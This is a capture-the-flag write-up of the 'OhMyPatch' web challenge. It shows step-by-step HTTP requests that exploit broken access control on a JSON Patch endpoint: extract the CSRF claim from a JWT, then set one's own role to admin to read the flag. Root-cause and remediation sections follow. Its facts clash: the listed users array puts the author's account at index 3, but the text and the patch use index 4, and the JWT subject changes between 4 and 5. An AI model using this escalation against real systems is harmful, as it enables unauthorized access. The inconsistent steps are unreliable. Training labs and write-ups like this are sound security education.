# 🔪 OhMyPatch — FlagYard Training Labs (Easy Web)

> **Platform:** FlagYard Training Labs
> **Challenge:** OhMyPatch — "Don't worry about cutting meat, Butcher will do it!"
> **Author:** SAFCSP · **Category:** Web · **Difficulty:** Easy
> **Target Instance:** `http://k725e76b27717474b73976e5483536571.playat.flagyard.com`
> **Final Flag:** `FlagY{daf0138fb7c7185c276bdd957e2e5a02}`
> **Solved by:** Fares Badaj (@ptok3)

---

## 📌 Overview

"You don't need to worry about cutting the meat — the Butcher will do it!" The app, **Butcher**, is an under-development "Users Information" portal:

| Endpoint | Method | Notes |
|---|---|---|
| `/` | GET | Landing page; terminal flavour hints `ls / → flag secret me how can i patch` |
| `/register` | POST | `{name, age, department}` → `{access_token, message}` (JWT) |
| `/users` | GET | Bearer required → `{"users":[...]}` including a `role` field |
| `/patch` | PATCH | RFC-6902 **JSON Patch** applied to the `users` data structure |
| `/flag` | GET | Bearer required, only for `role == "admin"` → `{"flag":"FlagY{...}"}` |

The whole challenge is an **IDOR-style broken access control**: an authenticated (but low-privileged) user is allowed to JSON-Patch *any* index of the users array, so we simply flip our own `role` to `"admin"` and then read `/flag`.

---

## 🔍 1) Recon

* No JS, just `styles.css`. Route methods discovered via `OPTIONS`:
  * `/users` → `HEAD, OPTIONS, GET` (auth required)
  * `/patch` → `OPTIONS, PATCH`  ← the interesting one
  * `/flag` → `HEAD, OPTIONS, GET` (auth required)
* `GET /flag` with a fresh user token → `403 {"message":"You are not authorized to access this resource"}`.
* Register → JWT (`Flask-JWT-Extended`): payload carries `{"fresh":false,"jti":...,"type":"access","sub":4,"csrf":...,"exp":...}` — note the **`csrf` claim inside the JWT**.
* `GET /users` → Alice/Bob/Charlie + our account, every `role` is `"user"`.

So the object to read is `/flag`; the gate is `role`; the mutation primitive is `/patch`.

---

## 2) Understanding `/patch`

`OPTIONS /patch` advertises only **PATCH**, and it expects an **RFC 6902 JSON Patch** document with media type `application/json-patch+json`:

```http
PATCH /patch HTTP/1.1
Authorization: Bearer <ACCESS_TOKEN>
X-CSRF-Token: <CSRF_FROM_JWT>
Content-Type: application/json-patch+json

[{"op":"replace","path":"/users/<INDEX>/role","value":"admin"}]
```

Three non-obvious requirements that turn "Invalid JSON data" into a success:

1. **`Content-Type: application/json-patch+json`** — sending plain `application/json` (or form data) is rejected.
2. **`X-CSRF-Token`** header must equal the `csrf` claim decoded from the JWT payload.
3. **`path` is array-index based**: `/users/<n>/role`, where `<n>` is the position of your user inside the `users` JSON array (0-indexed), **not** the `id` column.

The server applies the JSON Patch to the in-memory/DB user list **without any ownership, index, or role check** — any authenticated caller can patch any user.

---

## 🎯 3) Exploitation

### Step 1 — Register a controlled account

```http
POST /register
Content-Type: application/json

{"name":"butcher_272666","age":27,"department":"hr"}
```

→ `200 {"access_token":"eyJhbGciOiJIUzI1NiIs...","message":"User registered successfully"}`

### Step 2 — Read the users array and locate our index

```http
GET /users
Authorization: Bearer <ACCESS_TOKEN>
```

```json
{"users":[
  {"age":35,"department":"Engineering","id":1,"name":"Alice","role":"user"},
  {"age":28,"department":"Marketing",   "id":2,"name":"Bob","role":"user"},
  {"age":40,"department":"Sales",       "id":3,"name":"Charlie","role":"user"},
  {"age":27,"department":"hr",          "id":5,"name":"butcher_272666","role":"user"}]}
```

Our account is at **array index 4** (0-based) — that's the target of the patch.

### Step 3 — Extract the CSRF from the JWT

```bash
jq -R 'split(".")[1] | @base64d' <<<"$ACCESS_TOKEN"   # Base64URL(JSON) -> {"...","csrf":"..."}
```

Decoded payload: `{"fresh":false,"jti":"...","type":"access","sub":5,"csrf":"1eff6a89-0388-4c7e-956c-b9b44e907170","nbf":...,"exp":...}`

### Step 4 — Flip our role to admin with JSON Patch

```http
PATCH /patch HTTP/1.1
Authorization: Bearer <ACCESS_TOKEN>
X-CSRF-Token: 1eff6a89-0388-4c7e-956c-b9b44e907170
Content-Type: application/json-patch+json

[{"op":"replace","path":"/users/4/role","value":"admin"}]
```

→ `200` and the updated user list, where `butcher_272666` now has `"role":"admin"`.

### Step 5 — Read the flag

```http
GET /flag
Authorization: Bearer <ACCESS_TOKEN>
```

→ `200 {"flag":"FlagY{daf0138fb7c7185c276bdd957e2e5a02}"}`

**🏁 FLAG RECOVERED:** `FlagY{daf0138fb7c7185c276bdd957e2e5a02}`

The full automation is in [`solve_ohmypatch.py`](./solve_ohmypatch.py) (single command → live escalate + `flag_from_ohmypatch.txt`).

---

## 🔬 4) Root Cause Analysis

1. **Broken access control on the PATCH primitive** — `/patch` enforces *authentication* but no *authorization*: your token can patch *any* index of the users list, including your own `role`.
2. **Sensitive gate based on a mutable field** — `/flag` only checks the current `role` attribute of the caller; `role` is perfectly writable by the same caller.
3. **Homegrown JSON Patch handling with shop-drafted trust assumed** — the server replays the RFC-6902 ops verbatim against its data structure, trusting the caller to only touch their own row.

---

## 🛠️ 5) Remediation

* Server-side ownership check: when patching `/users/<i>`, assert `<i>` belongs to the JWT `sub` (or restrict ops to a `self` path).
* Reject patches whose `path` targets `role`/`is_admin` unless a separate high-privilege flow authorizes it; treat `role` as admin-only write.
* Provide a purpose-built `PATCH /users/me` endpoint rather than exposing raw JSON Patch over the whole collection.
* Resolve the target by authenticated identity (`id` from JWT), never by a caller-supplied index.

---

## 💡 6) Practical Takeaways

* **405/OPTIONS recon is a goldmine** — `Allow: OPTIONS, PATCH` on an otherwise hidden `/patch` told us the whole story instantly.
* **"Authenticated" ≠ "authorized".** The JWT proved *who* we were, but nothing checked *what we could do*.
* **CSRF claim inside the JWT is not a security boundary** — it only proves the client can decode its own token (of course it can); it never blocks the holder from writing JSON Patch ops.
* **Read the endpoint's expected media type.** Swapping `Content-Type` to `application/json-patch+json` (plus array-index paths) turned every "Invalid JSON data" into a 200.

---

## 👑 Credits

Made with ❤ by **Fares Badaj** — Red Team Operator | Penetration Tester Specialist

- Telegram: [@ptok3](https://t.me/ptok3)
- GitHub: [github.com/FaresBadaj](https://github.com/FaresBadaj)
- LinkedIn: [linkedin.com/in/FaresBadaj](https://www.linkedin.com/in/FaresBadaj)
- Credly: [credly.com/users/faresbadaj](https://www.credly.com/users/faresbadaj)

*Technique reference: virus — "[Writeup] OhMyPatch (WEB, Easy)" (register → csrf from JWT → RFC-6902 JSON Patch `/users/<index>/role=admin` → `/flag`).*